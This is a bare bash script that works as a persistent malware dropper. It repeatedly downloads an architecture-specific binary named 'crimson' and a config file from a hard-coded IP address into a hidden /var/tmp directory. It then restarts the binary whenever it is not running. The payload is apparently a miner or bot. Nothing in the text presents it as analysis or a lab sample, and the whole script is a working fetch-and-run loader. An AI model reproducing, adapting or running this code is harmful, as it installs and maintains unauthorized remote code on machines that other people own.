#!/bin/bash

while true; do
    if [ ! -f /var/tmp/.crimson/crimson ] || [ ! -d /var/tmp/.crimson ]; then
        mkdir -p /var/tmp/.crimson
        ARM_BIN="http://164.132.235.119/crimson.arm"
        X86_BIN="http://164.132.235.119/crimson.x86"
        CNF_BIN="http://164.132.235.119/config.json"

        curl --connect-timeout 35 --insecure -sL "$CNF_BIN" -o /var/tmp/.crimson/config.json

        if [[ "$(uname -m)" == "armv8l" || "$(uname -m)" == "aarch64" ]]; then
            curl --connect-timeout 35 --insecure -sL "$ARM_BIN" -o /var/tmp/.crimson/crimson
        elif [[ "$(uname -m)" == "x86_64" ]]; then
            curl --connect-timeout 35 --insecure -sL "$X86_BIN" -o /var/tmp/.crimson/crimson
        fi
    fi

    if ! pgrep -x "crimson" > /dev/null; then
        /var/tmp/.crimson/crimson --config=/var/tmp/.crimson/config.json
    fi
    sleep 5
done
